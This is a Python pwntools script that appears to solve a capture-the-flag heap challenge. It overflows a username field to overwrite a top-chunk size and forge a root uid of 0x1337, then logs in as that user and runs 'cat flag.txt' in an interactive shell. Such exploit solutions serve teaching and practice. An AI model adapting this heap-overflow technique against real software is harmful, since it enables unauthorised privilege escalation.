from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)

def add_user(length,username):
    log.info("Adding User(%i,%s)" %(length,username))
    p.recvuntil(b'>')
    p.sendline(b'1')
    p.recvuntil(b'length:')
    p.sendline(b'%i' %length)
    p.recvuntil(b'Username:')
    p.sendline(username)

def login(username):
    log.info("Login User(%s)" %username)
    p.sendline(b'2')
    p.sendline(username)
    log.info("%s" %p.recvline())

p = start()

pad = cyclic(20)
top_chunk_sz_field = p64(0x3000)
root_uid  = p32(0x1337)
root_user = b'A'

add_user(0, pad+top_chunk_sz_field+root_uid+root_user)
add_user(2, root_user)
login(root_user)

p.sendline(b'cat flag.txt')
p.interactive()
